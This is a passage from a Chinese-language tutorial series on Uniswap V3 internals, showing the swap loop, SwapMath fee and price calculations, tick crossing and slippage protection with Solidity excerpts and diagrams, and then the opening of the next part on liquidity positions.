S6\n    E1 --&gt;|&quot;设置&quot;| S7\n\n    S1 --&gt;|&quot;循环更新&quot;| E2\n    S2 --&gt;|&quot;循环更新&quot;| E2\n    S3 --&gt;|&quot;循环更新&quot;| E2\n    S4 --&gt;|&quot;循环更新&quot;| E2\n    S5 --&gt;|&quot;循环更新&quot;| E2\n    S6 --&gt;|&quot;循环更新&quot;| E2\n    S7 --&gt;|&quot;循环更新&quot;| E2\n\n    E2 --&gt;|&quot;循环结束&quot;| E3\n\n    style SwapStateStruct fill:#fff3e0\n\n2.2 SwapCache：交换缓存\nSwapCache存储交换过程中不变或很少变化的数据：\nstruct SwapCache {\n    // 交换开始时的流动性\n    uint128 liquidityStart;\n \n    // 区块时间戳\n    uint32 blockTimestamp;\n \n    // 协议费率（针对输入代币）\n    uint8 feeProtocol;\n \n    // 每流动性秒数累积值\n    uint160 secondsPerLiquidityCumulativeX128;\n \n    // tick累积值\n    int56 tickCumulative;\n \n    // 是否已计算最新观察值\n    bool computedLatestObservation;\n}\n2.3 StepComputations：单步计算结果\n每次循环迭代的计算结果：\nstruct StepComputations {\n    // 本步开始时的价格\n    uint160 sqrtPriceStartX96;\n \n    // 下一个目标tick\n    int24 tickNext;\n \n    // 下一个tick是否已初始化\n    bool initialized;\n \n    // 目标价格\n    uint160 sqrtPriceNextX96;\n \n    // 本步输入数量\n    uint256 amountIn;\n \n    // 本步输出数量\n    uint256 amountOut;\n \n    // 本步费用\n    uint256 feeAmount;\n}\nflowchart TD\n    subgraph StepCalculationFlow[&quot;单步计算流程&quot;]\n        S1[记录起始价格&lt;br/&gt;sqrtPriceStartX96]\n        S2[查找下一个tick&lt;br/&gt;tickNext, initialized]\n        S3[计算目标价格&lt;br/&gt;sqrtPriceNextX96]\n        S4[执行交换计算&lt;br/&gt;amountIn, amountOut]\n        S5[计算费用&lt;br/&gt;feeAmount]\n    end\n\n    S1 --&gt; S2 --&gt; S3 --&gt; S4 --&gt; S5\n\n    style StepCalculationFlow fill:#e8f5e9\n\n\n3. 交换执行流程\n3.1 完整流程图\nflowchart TB\n    START[开始交换] --&gt; VALIDATE[参数验证]\n    VALIDATE --&gt; LOCK[设置重入锁]\n    LOCK --&gt; INIT_CACHE[初始化SwapCache]\n    INIT_CACHE --&gt; INIT_STATE[初始化SwapState]\n\n    INIT_STATE --&gt; LOOP_START{剩余数量!=0&lt;br/&gt;且&lt;br/&gt;未达价格限制?}\n\n    LOOP_START --&gt;|是| FIND_TICK[查找下一个初始化的tick]\n    FIND_TICK --&gt; CALC_TARGET[计算目标价格]\n    CALC_TARGET --&gt; SWAP_STEP[执行单步交换&lt;br/&gt;SwapMath.computeSwapStep]\n\n    SWAP_STEP --&gt; UPDATE_STATE[更新SwapState]\n    UPDATE_STATE --&gt; UPDATE_FEE[更新费用增长率]\n\n    UPDATE_FEE --&gt; CROSS_CHECK{到达tick边界?}\n    CROSS_CHECK --&gt;|是| CROSS_TICK[执行tick跨越&lt;br/&gt;更新流动性]\n    CROSS_CHECK --&gt;|否| RECALC_TICK[重新计算当前tick]\n\n    CROSS_TICK --&gt; LOOP_START\n    RECALC_TICK --&gt; LOOP_START\n\n    LOOP_START --&gt;|否| UPDATE_GLOBAL[更新全局状态]\n    UPDATE_GLOBAL --&gt; TRANSFER[执行代币转账]\n    TRANSFER --&gt; CALLBACK[调用回调函数]\n    CALLBACK --&gt; VERIFY[验证余额变化]\n    VERIFY --&gt; EMIT[发出Swap事件]\n    EMIT --&gt; UNLOCK[释放重入锁]\n    UNLOCK --&gt; END[结束]\n\n    style SWAP_STEP fill:#fff3e0\n    style CROSS_TICK fill:#ffcdd2\n\n3.2 初始化阶段\nfunction swap(...) external override noDelegateCall returns (...) {\n    // 1. 参数验证\n    require(amountSpecified != 0, &#039;AS&#039;);\n \n    Slot0 memory slot0Start = slot0;\n    require(slot0Start.unlocked, &#039;LOK&#039;);\n \n    // 2. 价格限制验证\n    require(\n        zeroForOne\n            ? sqrtPriceLimitX96 &lt; slot0Start.sqrtPriceX96 &amp;&amp;\n              sqrtPriceLimitX96 &gt; TickMath.MIN_SQRT_RATIO\n            : sqrtPriceLimitX96 &gt; slot0Start.sqrtPriceX96 &amp;&amp;\n              sqrtPriceLimitX96 &lt; TickMath.MAX_SQRT_RATIO,\n        &#039;SPL&#039;\n    );\n \n    // 3. 设置重入锁\n    slot0.unlocked = false;\n \n    // 4. 初始化缓存\n    SwapCache memory cache = SwapCache({\n        liquidityStart: liquidity,\n        blockTimestamp: _blockTimestamp(),\n        feeProtocol: zeroForOne\n            ? (slot0Start.feeProtocol % 16)\n            : (slot0Start.feeProtocol &gt;&gt; 4),\n        secondsPerLiquidityCumulativeX128: 0,\n        tickCumulative: 0,\n        computedLatestObservation: false\n    });\n \n    // 5. 初始化状态\n    bool exactInput = amountSpecified &gt; 0;\n    SwapState memory state = SwapState({\n        amountSpecifiedRemaining: amountSpecified,\n        amountCalculated: 0,\n        sqrtPriceX96: slot0Start.sqrtPriceX96,\n        tick: slot0Start.tick,\n        feeGrowthGlobalX128: zeroForOne\n            ? feeGrowthGlobal0X128\n            : feeGrowthGlobal1X128,\n        protocolFee: 0,\n        liquidity: cache.liquidityStart\n    });\n \n    // ... 主循环\n}\n价格限制验证的逻辑：\nflowchart TD\n    subgraph TrueGroup[&quot;zeroForOne = true (价格下降)&quot;]\n        A1[sqrtPriceLimitX96 &lt; 当前价格]\n        A2[sqrtPriceLimitX96 &gt; MIN_SQRT_RATIO]\n        A3[允许交换]\n        A1 --&gt; A3\n        A2 --&gt; A3\n    end\n\n    subgraph FalseGroup[&quot;zeroForOne = false (价格上升)&quot;]\n        B1[sqrtPriceLimitX96 &gt; 当前价格]\n        B2[sqrtPriceLimitX96 &lt; MAX_SQRT_RATIO]\n        B3[允许交换]\n        B1 --&gt; B3\n        B2 --&gt; B3\n    end\n\n    style A3 fill:#c8e6c9\n    style B3 fill:#c8e6c9\n\n3.3 主循环：跨Tick交换\n// 主交换循环\nwhile (state.amountSpecifiedRemaining != 0 &amp;&amp;\n       state.sqrtPriceX96 != sqrtPriceLimitX96) {\n \n    StepComputations memory step;\n    step.sqrtPriceStartX96 = state.sqrtPriceX96;\n \n    // 1. 查找下一个初始化的tick\n    (step.tickNext, step.initialized) = tickBitmap\n        .nextInitializedTickWithinOneWord(\n            state.tick,\n            tickSpacing,\n            zeroForOne\n        );\n \n    // 2. tick边界检查\n    if (step.tickNext &lt; TickMath.MIN_TICK) {\n        step.tickNext = TickMath.MIN_TICK;\n    } else if (step.tickNext &gt; TickMath.MAX_TICK) {\n        step.tickNext = TickMath.MAX_TICK;\n    }\n \n    // 3. 计算目标价格\n    step.sqrtPriceNextX96 = TickMath.getSqrtRatioAtTick(step.tickNext);\n \n    // 4. 执行单步交换\n    (state.sqrtPriceX96, step.amountIn, step.amountOut, step.feeAmount) =\n        SwapMath.computeSwapStep(\n            state.sqrtPriceX96,\n            // 取价格限制和目标价格中更接近当前价格的值\n            (zeroForOne\n                ? step.sqrtPriceNextX96 &lt; sqrtPriceLimitX96\n                : step.sqrtPriceNextX96 &gt; sqrtPriceLimitX96)\n                ? sqrtPriceLimitX96\n                : step.sqrtPriceNextX96,\n            state.liquidity,\n            state.amountSpecifiedRemaining,\n            fee\n        );\n \n    // 5. 更新状态\n    // ... (后续详解)\n}\nsequenceDiagram\n    participant Loop as 主循环\n    participant Bitmap as TickBitmap\n    participant Math as SwapMath\n    participant State as SwapState\n\n    Loop-&gt;&gt;Bitmap: 查找下一个tick\n    Bitmap--&gt;&gt;Loop: tickNext, initialized\n    Loop-&gt;&gt;Math: getSqrtRatioAtTick(tickNext)\n    Math--&gt;&gt;Loop: sqrtPriceNextX96\n    Loop-&gt;&gt;Math: computeSwapStep(...)\n    Math--&gt;&gt;Loop: newPrice, amountIn, amountOut, fee\n    Loop-&gt;&gt;State: 更新状态\n    State--&gt;&gt;Loop: 继续或退出循环\n\n\n4. SwapMath：核心计算引擎\n4.1 computeSwapStep函数解析\n这是整个交换过程中最核心的数学计算函数：\nfunction computeSwapStep(\n    uint160 sqrtRatioCurrentX96,    // 当前价格\n    uint160 sqrtRatioTargetX96,     // 目标价格（tick边界或价格限制）\n    uint128 liquidity,              // 当前流动性\n    int256 amountRemaining,         // 剩余交换数量\n    uint24 feePips                  // 费率（以百万分之一为单位）\n) internal pure returns (\n    uint160 sqrtRatioNextX96,       // 交换后的新价格\n    uint256 amountIn,               // 输入数量\n    uint256 amountOut,              // 输出数量\n    uint256 feeAmount               // 费用\n) {\n    bool zeroForOne = sqrtRatioCurrentX96 &gt;= sqrtRatioTargetX96;\n    bool exactIn = amountRemaining &gt;= 0;\n \n    // ... 详细计算逻辑\n}\n4.2 精确输入模式（exactIn = true）\nflowchart TD\n    START[精确输入模式] --&gt; CALC_FEE[计算扣除费用后的数量&lt;br/&gt;amountRemainingLessFee]\n    CALC_FEE --&gt; CALC_NEEDED[计算到达目标价格&lt;br/&gt;需要的输入数量]\n\n    CALC_NEEDED --&gt; CHECK{扣费后数量 &gt;= 需要数量?}\n\n    CHECK --&gt;|是| REACH_TARGET[能到达目标价格&lt;br/&gt;sqrtRatioNext = target]\n    CHECK --&gt;|否| PARTIAL[部分交换&lt;br/&gt;计算能到达的新价格]\n\n    REACH_TARGET --&gt; RECALC[重新计算精确的&lt;br/&gt;amountIn和amountOut]\n    PARTIAL --&gt; RECALC\n\n    RECALC --&gt; CALC_FINAL_FEE[计算最终费用]\n    CALC_FINAL_FEE --&gt; END[返回结果]\n\n    style CALC_FEE fill:#fff3e0\n    style CHECK fill:#e8f5e9\n\nif (exactIn) {\n    // 扣除费用后的可用数量\n    uint256 amountRemainingLessFee = FullMath.mulDiv(\n        uint256(amountRemaining),\n        1e6 - feePips,\n        1e6\n    );\n \n    // 计算到达目标价格需要的输入数量\n    amountIn = zeroForOne\n        ? SqrtPriceMath.getAmount0Delta(\n            sqrtRatioTargetX96, sqrtRatioCurrentX96, liquidity, true)\n        : SqrtPriceMath.getAmount1Delta(\n            sqrtRatioCurrentX96, sqrtRatioTargetX96, liquidity, true);\n \n    // 判断能否到达目标价格\n    if (amountRemainingLessFee &gt;= amountIn) {\n        sqrtRatioNextX96 = sqrtRatioTargetX96;\n    } else {\n        // 计算在给定输入下能到达的新价格\n        sqrtRatioNextX96 = SqrtPriceMath.getNextSqrtPriceFromInput(\n            sqrtRatioCurrentX96,\n            liquidity,\n            amountRemainingLessFee,\n            zeroForOne\n        );\n    }\n}\n4.3 精确输出模式（exactIn = false）\nelse {\n    // 计算到达目标价格能获得的输出数量\n    amountOut = zeroForOne\n        ? SqrtPriceMath.getAmount1Delta(\n            sqrtRatioTargetX96, sqrtRatioCurrentX96, liquidity, false)\n        : SqrtPriceMath.getAmount0Delta(\n            sqrtRatioCurrentX96, sqrtRatioTargetX96, liquidity, false);\n \n    // 判断能否满足输出需求\n    if (uint256(-amountRemaining) &gt;= amountOut) {\n        sqrtRatioNextX96 = sqrtRatioTargetX96;\n    } else {\n        // 计算产生指定输出所需的新价格\n        sqrtRatioNextX96 = SqrtPriceMath.getNextSqrtPriceFromOutput(\n            sqrtRatioCurrentX96,\n            liquidity,\n            uint256(-amountRemaining),\n            zeroForOne\n        );\n    }\n}\n4.4 费用计算策略\nflowchart TD\n    subgraph FeeCalculationScenarios[&quot;费用计算场景&quot;]\n        S1[场景1: 精确输入&lt;br/&gt;未到达目标价格]\n        S2[场景2: 精确输入&lt;br/&gt;到达目标价格]\n        S3[场景3: 精确输出]\n    end\n\n    S1 --&gt; F1[&quot;feeAmount = amountRemaining - amountIn&lt;br/&gt;剩余全部作为费用&quot;]\n    S2 --&gt; F2[&quot;feeAmount = amountIn × feePips / (1e6 - feePips)&lt;br/&gt;基于输入计算&quot;]\n    S3 --&gt; F2\n\n    style F1 fill:#ffcdd2\n    style F2 fill:#c8e6c9\n\n// 计算费用\nif (exactIn &amp;&amp; sqrtRatioNextX96 != sqrtRatioTargetX96) {\n    // 未到达目标价格，剩余输入全部作为费用\n    feeAmount = uint256(amountRemaining) - amountIn;\n} else {\n    // 基于实际输入计算费用\n    feeAmount = FullMath.mulDivRoundingUp(\n        amountIn,\n        feePips,\n        1e6 - feePips\n    );\n}\n\n5. 跨Tick处理机制\n5.1 Tick跨越的触发条件\nflowchart TD\n    AFTER_SWAP[单步交换后] --&gt; CHECK{新价格 == 目标价格?}\n\n    CHECK --&gt;|是| INIT_CHECK{目标tick已初始化?}\n    CHECK --&gt;|否| RECALC[重新计算当前tick&lt;br/&gt;getTickAtSqrtRatio]\n\n    INIT_CHECK --&gt;|是| CROSS[执行tick跨越]\n    INIT_CHECK --&gt;|否| UPDATE_TICK[仅更新tick索引]\n\n    CROSS --&gt; UPDATE_ORACLE[更新预言机&lt;br/&gt;（如果需要）]\n    UPDATE_ORACLE --&gt; CROSS_TICK[调用ticks.cross()]\n    CROSS_TICK --&gt; UPDATE_LIQ[更新活跃流动性]\n    UPDATE_LIQ --&gt; NEXT_TICK[设置下一个tick]\n\n    UPDATE_TICK --&gt; NEXT_TICK\n    RECALC --&gt; CONTINUE[继续循环]\n    NEXT_TICK --&gt; CONTINUE\n\n    style CROSS fill:#fff3e0\n    style UPDATE_LIQ fill:#e8f5e9\n\n5.2 Tick跨越代码实现\n// 处理tick跨越\nif (state.sqrtPriceX96 == step.sqrtPriceNextX96) {\n    // 到达了tick边界\n    if (step.initialized) {\n        // 首次跨越时计算预言机数据\n        if (!cache.computedLatestObservation) {\n            (cache.tickCumulative, cache.secondsPerLiquidityCumulativeX128) =\n                observations.observeSingle(\n                    cache.blockTimestamp,\n                    0,\n                    slot0Start.tick,\n                    slot0Start.observationIndex,\n                    cache.liquidityStart,\n                    slot0Start.observationCardinality\n                );\n            cache.computedLatestObservation = true;\n        }\n \n        // 执行tick跨越，获取流动性变化\n        int128 liquidityNet = ticks.cross(\n            step.tickNext,\n            (zeroForOne ? state.feeGrowthGlobalX128 : feeGrowthGlobal0X128),\n            (zeroForOne ? feeGrowthGlobal1X128 : state.feeGrowthGlobalX128),\n            cache.secondsPerLiquidityCumulativeX128,\n            cache.tickCumulative,\n            cache.blockTimestamp\n        );\n \n        // 根据方向调整流动性变化的符号\n        if (zeroForOne) liquidityNet = -liquidityNet;\n \n        // 更新活跃流动性\n        state.liquidity = LiquidityMath.addDelta(\n            state.liquidity,\n            liquidityNet\n        );\n    }\n \n    // 更新当前tick\n    state.tick = zeroForOne ? step.tickNext - 1 : step.tickNext;\n} else if (state.sqrtPriceX96 != step.sqrtPriceStartX96) {\n    // 价格变化但未到达tick边界，重新计算tick\n    state.tick = TickMath.getTickAtSqrtRatio(state.sqrtPriceX96);\n}\n5.3 流动性变化的方向处理\nflowchart LR\n    subgraph &quot;价格向左移动 (zeroForOne=true)&quot;\n        L1[当前tick] --&gt;|跨越| L2[tickNext]\n        L3[&quot;liquidityNet = +100&lt;br/&gt;(原始值)&quot;]\n        L4[&quot;应用: -liquidityNet&lt;br/&gt;流动性减少100&quot;]\n    end\n\n    subgraph &quot;价格向右移动 (zeroForOne=false)&quot;\n        R1[当前tick] --&gt;|跨越| R2[tickNext]\n        R3[&quot;liquidityNet = +100&lt;br/&gt;(原始值)&quot;]\n        R4[&quot;应用: +liquidityNet&lt;br/&gt;流动性增加100&quot;]\n    end\n\n    L3 --&gt; L4\n    R3 --&gt; R4\n\n    style L4 fill:#ffcdd2\n    style R4 fill:#c8e6c9\n\n关键理解：liquidityNet的符号是基于”从左向右”跨越定义的，所以当价格向左移动时需要取反。\n\n6. 状态更新与结算\n6.1 循环内状态更新\n// 更新剩余数量和已计算数量\nif (exactInput) {\n    state.amountSpecifiedRemaining -=\n        (step.amountIn + step.feeAmount).toInt256();\n    state.amountCalculated = state.amountCalculated.sub(\n        step.amountOut.toInt256()\n    );\n} else {\n    state.amountSpecifiedRemaining += step.amountOut.toInt256();\n    state.amountCalculated = state.amountCalculated.add(\n        (step.amountIn + step.feeAmount).toInt256()\n    );\n}\n \n// 协议费用计算\nif (cache.feeProtocol &gt; 0) {\n    uint256 delta = step.feeAmount / cache.feeProtocol;\n    step.feeAmount -= delta;\n    state.protocolFee += uint128(delta);\n}\n \n// 更新全局费用增长率\nif (state.liquidity &gt; 0) {\n    state.feeGrowthGlobalX128 += FullMath.mulDiv(\n        step.feeAmount,\n        FixedPoint128.Q128,\n        state.liquidity\n    );\n}\n6.2 循环后全局状态更新\n// 更新slot0\nif (state.tick != slot0Start.tick) {\n    (uint16 observationIndex, uint16 observationCardinality) =\n        observations.write(\n            slot0Start.observationIndex,\n            cache.blockTimestamp,\n            slot0Start.tick,\n            cache.liquidityStart,\n            slot0Start.observationCardinality,\n            slot0Start.observationCardinalityNext\n        );\n \n    (slot0.sqrtPriceX96, slot0.tick,\n     slot0.observationIndex, slot0.observationCardinality) = (\n        state.sqrtPriceX96,\n        state.tick,\n        observationIndex,\n        observationCardinality\n    );\n} else {\n    slot0.sqrtPriceX96 = state.sqrtPriceX96;\n}\n \n// 更新流动性\nif (cache.liquidityStart != state.liquidity) {\n    liquidity = state.liquidity;\n}\n \n// 更新费用增长率和协议费用\nif (zeroForOne) {\n    feeGrowthGlobal0X128 = state.feeGrowthGlobalX128;\n    if (state.protocolFee &gt; 0) {\n        protocolFees.token0 += state.protocolFee;\n    }\n} else {\n    feeGrowthGlobal1X128 = state.feeGrowthGlobalX128;\n    if (state.protocolFee &gt; 0) {\n        protocolFees.token1 += state.protocolFee;\n    }\n}\n6.3 代币转账与回调\nsequenceDiagram\n    participant Pool as Pool合约\n    participant User as 调用者\n    participant Token as 代币合约\n\n    Pool-&gt;&gt;Pool: 计算amount0, amount1\n\n    alt zeroForOne = true\n        Pool-&gt;&gt;Token: 转出token1给recipient\n        Pool-&gt;&gt;User: uniswapV3SwapCallback(amount0, amount1, data)\n        User-&gt;&gt;Token: 转入token0给Pool\n        Pool-&gt;&gt;Pool: 验证token0余额增加\n    else zeroForOne = false\n        Pool-&gt;&gt;Token: 转出token0给recipient\n        Pool-&gt;&gt;User: uniswapV3SwapCallback(amount0, amount1, data)\n        User-&gt;&gt;Token: 转入token1给Pool\n        Pool-&gt;&gt;Pool: 验证token1余额增加\n    end\n\n    Pool-&gt;&gt;Pool: emit Swap事件\n    Pool-&gt;&gt;Pool: slot0.unlocked = true\n\n// 计算最终数量\n(amount0, amount1) = zeroForOne == exactInput\n    ? (amountSpecified - state.amountSpecifiedRemaining,\n       state.amountCalculated)\n    : (state.amountCalculated,\n       amountSpecified - state.amountSpecifiedRemaining);\n \n// 执行转账和回调\nif (zeroForOne) {\n    if (amount1 &lt; 0) {\n        TransferHelper.safeTransfer(token1, recipient, uint256(-amount1));\n    }\n \n    uint256 balance0Before = balance0();\n    IUniswapV3SwapCallback(msg.sender).uniswapV3SwapCallback(\n        amount0, amount1, data\n    );\n    require(balance0Before.add(uint256(amount0)) &lt;= balance0(), &#039;IIA&#039;);\n} else {\n    if (amount0 &lt; 0) {\n        TransferHelper.safeTransfer(token0, recipient, uint256(-amount0));\n    }\n \n    uint256 balance1Before = balance1();\n    IUniswapV3SwapCallback(msg.sender).uniswapV3SwapCallback(\n        amount0, amount1, data\n    );\n    require(balance1Before.add(uint256(amount1)) &lt;= balance1(), &#039;IIA&#039;);\n}\n \nemit Swap(msg.sender, recipient, amount0, amount1,\n          state.sqrtPriceX96, state.liquidity, state.tick);\n \nslot0.unlocked = true;\n\n7. 滑点保护机制\n7.1 价格限制的作用\nflowchart TD\n    subgraph NoProtection[&quot;无保护场景&quot;]\n        A1[大额交易]\n        A2[价格剧烈波动]\n        A3[交易者承受巨大滑点损失]\n        A1 --&gt; A2\n        A2 --&gt; A3\n    end\n\n    subgraph WithProtection[&quot;有保护场景&quot;]\n        B1[设置sqrtPriceLimitX96]\n        B2[价格到达限制时停止]\n        B3[部分成交，保护交易者]\n        B1 --&gt; B2\n        B2 --&gt; B3\n    end\n\n    style A3 fill:#ffcdd2\n    style B3 fill:#c8e6c9\n\n7.2 Router层的滑点保护\n// SwapRouter中的滑点保护\nfunction exactInputSingle(\n    ExactInputSingleParams calldata params\n) external payable override checkDeadline(params.deadline)\n  returns (uint256 amountOut) {\n \n    amountOut = exactInputInternal(\n        params.amountIn,\n        params.recipient,\n        params.sqrtPriceLimitX96,\n        SwapCallbackData({\n            path: abi.encodePacked(\n                params.tokenIn, params.fee, params.tokenOut\n            ),\n            payer: msg.sender\n        })\n    );\n \n    // 验证输出数量满足最小要求\n    require(amountOut &gt;= params.amountOutMinimum,\n            &#039;Too little received&#039;);\n}\n7.3 不同层次的保护机制\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n保护层机制作用Pool层sqrtPriceLimitX96限制最大价格变动Router层amountOutMinimum限制最小输出数量Router层deadline限制交易有效期前端滑点设置用户可配置的容忍度\n\n8. 价格发现机制\n8.1 动态价格发现过程\nflowchart LR\n    subgraph PriceDiscoveryLoop[&quot;价格发现循环&quot;]\n        P1[当前价格]\n        T1[tick区间1]\n        P2[新价格2]\n        T2[tick区间2]\n        P3[新价格3]\n        T3[tick区间3]\n        P4[最终价格]\n        P1 --&gt; T1\n        T1 --&gt;|消耗流动性| P2\n        P2 --&gt; T2\n        T2 --&gt;|消耗流动性| P3\n        P3 --&gt; T3\n        T3 --&gt; P4\n    end\n\n    subgraph LiquidityChanges[&quot;流动性变化&quot;]\n        L1[L=1000]\n        L2[L=800]\n        L3[L=1200]\n        L4[L=500]\n        L1 --&gt; L2\n        L2 --&gt; L3\n        L3 --&gt; L4\n    end\n\n    T1 -.-&gt; L1\n    T2 -.-&gt; L2\n    T3 -.-&gt; L3\n\n    style PriceDiscoveryLoop fill:#e3f2fd\n\n8.2 价格发现的特点\n分段线性：\n\n在每个tick区间内，价格变化是连续的\n遵循恒定乘积公式的变体\n\n流动性跳跃：\n\n跨越tick时流动性可能突变\n流动性变化影响后续的价格影响\n\n实时更新：\n\n每笔交易都即时更新价格\n没有延迟或批处理\n\n8.3 价格影响计算\n// 价格影响 = (新价格 - 旧价格) / 旧价格\nfunction calculatePriceImpact(\n    uint160 sqrtPriceBefore,\n    uint160 sqrtPriceAfter\n) internal pure returns (uint256 priceImpact) {\n    if (sqrtPriceAfter &gt; sqrtPriceBefore) {\n        priceImpact = FullMath.mulDiv(\n            sqrtPriceAfter - sqrtPriceBefore,\n            FixedPoint96.Q96,\n            sqrtPriceBefore\n        );\n    } else {\n        priceImpact = FullMath.mulDiv(\n            sqrtPriceBefore - sqrtPriceAfter,\n            FixedPoint96.Q96,\n            sqrtPriceBefore\n        );\n    }\n}\n\n9. 实际交换示例\n9.1 场景设置\n假设ETH/USDC池子，当前状态：\n\n价格：2000 USDC/ETH\n当前tick：69082\n活跃流动性：1,000,000\n费率：0.3% (3000)\n\n用户想用1000 USDC换取ETH。\n9.2 执行过程模拟\nflowchart TD\n    START[输入: 1000 USDC] --&gt; FEE[扣除费用: 997 USDC可用]\n    FEE --&gt; STEP1[步骤1: tick 69082-69022]\n\n    STEP1 --&gt; CALC1[消耗: 300 USDC&lt;br/&gt;获得: 0.15 ETH&lt;br/&gt;新tick: 69022]\n    CALC1 --&gt; CROSS1[跨越tick 69022&lt;br/&gt;流动性变化: +200,000]\n\n    CROSS1 --&gt; STEP2[步骤2: tick 69022-68962]\n    STEP2 --&gt; CALC2[消耗: 500 USDC&lt;br/&gt;获得: 0.248 ETH&lt;br/&gt;新tick: 68970]\n\n    CALC2 --&gt; STEP3[步骤3: 剩余197 USDC]\n    STEP3 --&gt; CALC3[消耗: 197 USDC&lt;br/&gt;获得: 0.0975 ETH]\n\n    CALC3 --&gt; RESULT[最终结果:&lt;br/&gt;输入: 1000 USDC&lt;br/&gt;输出: 0.4955 ETH&lt;br/&gt;有效价格: 2018.15]\n\n    style RESULT fill:#c8e6c9\n\n9.3 Gas消耗分析\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n操作估计Gas参数验证和初始化~5,000每次tick查找~2,100每次computeSwapStep~3,000每次tick跨越~15,000状态更新~5,000代币转账~50,000回调执行~30,000总计（跨2个tick）~125,000\n\n10. 本章小结\n10.1 核心概念回顾\nmindmap\n  root((交换机制))\n    数据结构\n      SwapState\n      SwapCache\n      StepComputations\n    执行流程\n      初始化\n      主循环\n      Tick跨越\n      状态结算\n    核心计算\n      SwapMath\n      SqrtPriceMath\n      费用计算\n    保护机制\n      价格限制\n      滑点控制\n      重入保护\n    价格发现\n      分段线性\n      流动性跳跃\n      实时更新\n\n10.2 关键设计总结\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n设计要点实现方式效果分步计算while循环 + StepComputations精确处理跨tick交换状态追踪SwapState结构完整记录交换过程费用处理费用增长率累积O(1)费用分配滑点保护sqrtPriceLimitX96防止价格过度滑动安全机制重入锁 + 余额验证防止攻击\n10.3 性能优化技巧\n\n单次SLOAD读取Slot0：减少存储访问\nmemory变量缓存：避免重复读取storage\n批量状态更新：循环结束后一次性更新\n位图快速查找：O(1)找到下一个tick\n\n\n下一篇预告\n在下一篇文章中，我们将深入探讨流动性管理与头寸，包括：\n\nmint和burn函数的完整实现\nPosition的创建和管理\n流动性数量与代币数量的计算\nNFT流动性代币的铸造机制\n\n\n参考资料\n\nUniswap V3 Core - UniswapV3Pool.sol\nUniswap V3 Core - SwapMath.sol\nUniswap V3 Core - SqrtPriceMath.sol\n"},"blockchainguide/DApp_Development/应用场景/defi/uniswap/v3/05-流动性管理与头寸":{"slug":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v3/05-流动性管理与头寸","filePath":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v3/05-流动性管理与头寸.md","title":"05-流动性管理与头寸","links":[],"tags":[],"content":"死磕Uniswap V3（五）：流动性管理与头寸\n\n本文是「死磕Uniswap V3」系列的第五篇，深入剖析V3的流动性管理机制、Position数据结构以及mint/burn操作的完整实现。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01概述与集中流动性AMM演进、集中流动性原理02Tick机制与价格数学Tick设计、价格转换算法03架构与合约设计Factory、Pool合约结构04交换机制深度解析swap函数、价格发现05流动性管理与头寸Position、mint/burn06费用系统与预言机费用分配、TWAP07MEV与套利策略JIT、三明治攻击\n\n1. 流动性管理概述\n1.1 V3流动性的独特性\n与V2不同，V3的流动性是非同质化的。每个流动性头寸都是独特的：\nflowchart TB\n    subgraph V2Group[&quot;V2 流动性 (ERC20)&quot;]\n        V2LP[LP Token]\n        V2A[LP A: 100 LP]\n        V2B[LP B: 100 LP]\n        V2C[LP C: 100 LP]\n        V2NOTE[所有LP权益相同&lt;br/&gt;可相互替代]\n        V2LP --&gt; V2A\n        V2LP --&gt; V2B\n        V2LP --&gt; V2C\n    end\n\n    subgraph V3Group[&quot;V3 流动性 (ERC721)&quot;]\n        V3NFT[NFT Position]\n        V3A[&quot;LP A: [1800,2200]&lt;br/&gt;L=1000&quot;]\n        V3B[&quot;LP B: [1900,2100]&lt;br/&gt;L=500&quot;]\n        V3C[&quot;LP C: [2000,2500]&lt;br/&gt;L=2000&quot;]\n        V3NOTE[每个头寸独特&lt;br/&gt;不可替代]\n        V3NFT --&gt; V3A\n        V3NFT --&gt; V3B\n        V3NFT --&gt; V3C\n    end\n\n    style V2Group fill:#ffcdd2\n    style V3Group fill:#c8e6c9\n\n1.2 核心操作流程\nflowchart LR\n    subgraph AddGroup[&quot;添加流动性&quot;]\n        M1[选择价格区间]\n        M2[计算所需代币]\n        M3[调用mint]\n        M4[获得NFT头寸]\n        M1 --&gt; M2\n        M2 --&gt; M3\n        M3 --&gt; M4\n    end\n\n    subgraph ManageGroup[&quot;管理流动性&quot;]\n        P1[增加流动性]\n        P2[收取费用]\n        P3[减少流动性]\n        P1 --&gt; P2\n        P2 --&gt; P3\n    end\n\n    subgraph RemoveGroup[&quot;移除流动性&quot;]\n        B1[调用burn]\n        B2[获得代币]\n        B3[调用collect]\n        B4[取回费用]\n        B1 --&gt; B2\n        B2 --&gt; B3\n        B3 --&gt; B4\n    end\n\n    AddGroup --&gt; ManageGroup\n    ManageGroup --&gt; RemoveGroup\n\n    style AddGroup fill:#e3f2fd\n    style ManageGroup fill:#fff3e0\n    style RemoveGroup fill:#fce4ec\n\n\n2. Position数据结构\n2.1 Position.Info详解\n每个流动性头寸由唯一的三元组标识：(owner, tickLower, tickUpper)\nlibrary Position {\n    struct Info {\n        // 此头寸的流动性数量\n        uint128 liquidity;\n \n        // 上次更新时的内部费用增长率\n        // 用于计算自上次操作以来累积的费用\n        uint256 feeGrowthInside0LastX128;\n        uint256 feeGrowthInside1LastX128;\n \n        // 待领取的费用（已结算但未提取）\n        uint128 tokensOwed0;\n        uint128 tokensOwed1;\n    }\n}\ngraph TB\n    subgraph PosGroup[&quot;Position.Info 结构&quot;]\n        L[liquidity&lt;br/&gt;uint128&lt;br/&gt;流动性数量]\n        FG0[feeGrowthInside0LastX128&lt;br/&gt;uint256&lt;br/&gt;token0费用增长快照]\n        FG1[feeGrowthInside1LastX128&lt;br/&gt;uint256&lt;br/&gt;token1费用增长快照]\n        TO0[tokensOwed0&lt;br/&gt;uint128&lt;br/&gt;待领取token0]\n        TO1[tokensOwed1&lt;br/&gt;uint128&lt;br/&gt;待领取token1]\n    end\n\n    subgraph FuncGroup[&quot;功能分类&quot;]\n        流动性管理[流动性管理]\n        费用追踪[费用追踪]\n        